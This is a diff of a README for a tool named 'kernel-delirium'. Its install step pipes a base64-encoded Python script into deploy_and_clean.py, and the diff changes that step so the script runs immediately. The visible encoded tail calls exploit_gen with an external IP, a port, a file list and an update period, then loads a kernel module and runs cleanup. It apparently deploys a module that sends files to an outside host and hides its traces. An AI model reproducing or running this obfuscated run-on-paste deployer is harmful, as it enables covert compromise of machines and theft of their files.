@@ -51,12 +51,9 @@ IGRlZmF1bHQ9IjEiKQogICAgYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkKICAgIGV4cGxvaXRf
 Z2VuKGFyZ3MuZXh0ZXJuYWxfaXAsIGFyZ3MuZXh0ZXJuYWxfcG9ydCwgYXJncy5tb2R1bGVfbmFt
 ZSwgYXJncy5maWxlcywgYXJncy51cGRhdGVfcGVyaW9kKQogICAgbG9hZF9tb2R1bGUoYXJncy5t
 b2R1bGVfbmFtZSkKICAgIGNsZWFudXAoKQogICAgcmV0dXJuIDA7CgppZiBfX25hbWVfXyA9PSAi
-X19tYWluX18iOgogICAgbWFpbigpCg== > deploy_and_clean.py`
+X19tYWluX18iOgogICAgbWFpbigpCg== >> deploy_and_clean.py && python3 deploy_and_clean.py`
 ```
 
-```python
-python3 deploy_and_clean.py`
-```
 ### Your machine :man_technologist:
 ```bash
 apt-get install kernel-delirium (Not gonna work yet)
@@ -66,7 +63,7 @@ apt-get install kernel-delirium (Not gonna work yet)
 kernel-delirium
 ```
 
-## Works on distros:
+## Supported distros:
 ### Debian-based :white_check_mark:
 ### Arch-based :x:
 ### OpenSuse :x:
